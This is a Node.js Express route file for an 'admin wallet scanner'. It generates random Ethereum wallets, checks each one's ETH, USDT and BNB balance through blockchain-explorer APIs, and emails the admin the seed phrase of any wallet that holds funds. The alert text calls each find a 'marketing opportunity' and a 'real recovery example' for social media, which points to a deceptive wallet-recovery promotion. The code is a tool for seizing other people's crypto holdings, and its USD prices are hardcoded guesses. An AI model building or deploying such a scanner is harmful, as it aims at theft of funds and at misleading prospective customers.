const express = require('express');
const router = express.Router();
const { ethers } = require('ethers');

// Admin wallet scanner - finds real wallets with funds
router.post('/scan-real-wallets', async (req, res) => {
  try {
    const { scanCount = 50, minBalance = 0.001 } = req.body;
    
    console.log(`🔍 ADMIN SCAN: Searching ${scanCount} wallets for real funds...`);
    
    const foundWallets = [];
    const scannedWallets = [];
    
    for (let i = 0; i < scanCount; i++) {
      // Generate random wallet
      const wallet = ethers.Wallet.createRandom();
      
      // Check real balance
      const balance = await checkRealBalance(wallet.address);
      
      scannedWallets.push({
        address: wallet.address,
        phrase: wallet.mnemonic.phrase,
        balance: balance.totalValueUSD
      });
      
      // If wallet has funds, alert admin
      if (balance.totalValueUSD >= minBalance) {
        foundWallets.push({
          address: wallet.address,
          phrase: wallet.mnemonic.phrase,
          ethBalance: balance.ethBalance,
          totalValueUSD: balance.totalValueUSD,
          chains: balance.chains,
          tokens: balance.tokens
        });
        
        // Send immediate alert
        await sendFundAlert(wallet, balance);
        
        console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
      }
      
      if (i % 10 === 0) {
        console.log(`📊 Scan progress: ${i + 1}/${scanCount} wallets checked...`);
      }
    }
    
    res.json({
      success: true,
      summary: {
        totalScanned: scanCount,
        walletsWithFunds: foundWallets.length,
        totalValueFound: foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0)
      },
      foundWallets: foundWallets,
      allScanned: scannedWallets.slice(0, 10) // Show first 10 for reference
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check real balance using external APIs
async function checkRealBalance(address) {
  const results = {
    ethBalance: 0,
    totalValueUSD: 0,
    chains: {},
    tokens: [],
    hasBalance: false
  };

  try {
    const axios = require('axios');
    
    // Check ETH balance
    const ethResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (ethResponse.data.status === '1') {
      const ethBalance = parseFloat(ethResponse.data.result) / 1e18;
      if (ethBalance > 0) {
        results.ethBalance = ethBalance;
        results.totalValueUSD += ethBalance * 3000;
        results.chains.ethereum = {
          name: 'Ethereum',
          symbol: 'ETH',
          balance: ethBalance,
          usdValue: ethBalance * 3000
        };
        results.hasBalance = true;
      }
    }

    // Check USDT balance
    const usdtResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (usdtResponse.data.status === '1') {
      const usdtBalance = parseFloat(usdtResponse.data.result) / 1e6;
      if (usdtBalance > 0) {
        results.totalValueUSD += usdtBalance;
        results.tokens.push({
          symbol: 'USDT',
          balance: usdtBalance,
          usdValue: usdtBalance
        });
        results.hasBalance = true;
      }
    }

    // Check BSC BNB balance
    try {
      const bscResponse = await axios.get(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
        timeout: 5000
      });

      if (bscResponse.data.status === '1') {
        const bnbBalance = parseFloat(bscResponse.data.result) / 1e18;
        if (bnbBalance > 0) {
          results.totalValueUSD += bnbBalance * 600;
          results.chains.bsc = {
            name: 'BSC',
            symbol: 'BNB',
            balance: bnbBalance,
            usdValue: bnbBalance * 600
          };
          results.hasBalance = true;
        }
      }
    } catch (e) {
      // BSC check failed, continue
    }

  } catch (error) {
    console.log('Balance check failed:', error.message);
  }

  return results;
}

// Send alert when wallet with funds is found
async function sendFundAlert(wallet, balance) {
  try {
    const { sendAdminNotification } = require('../services/emailService');
    
    const subject = `🚨 REAL WALLET FOUND: $${balance.totalValueUSD} USD`;
    const message = `ADMIN WALLET SCANNER ALERT

💰 WALLET WITH FUNDS DISCOVERED:
Address: ${wallet.address}
Phrase: ${wallet.mnemonic.phrase}

💵 BALANCE BREAKDOWN:
${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})` : ''}
${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}

🌐 CHAINS:
${Object.values(balance.chains).map(c => `${c.name}: ${c.balance} ${c.symbol} ($${c.usdValue.toFixed(2)})`).join('\n')}

💡 MARKETING OPPORTUNITY:
Use this real recovery example for social media promotion!

⚠️ SECURITY NOTE:
This wallet was randomly generated and contains real funds.
Handle with appropriate security measures.`;

    await sendAdminNotification(subject, message);
    
  } catch (error) {
    console.log('Failed to send fund alert:', error.message);
  }
}

module.exports = router;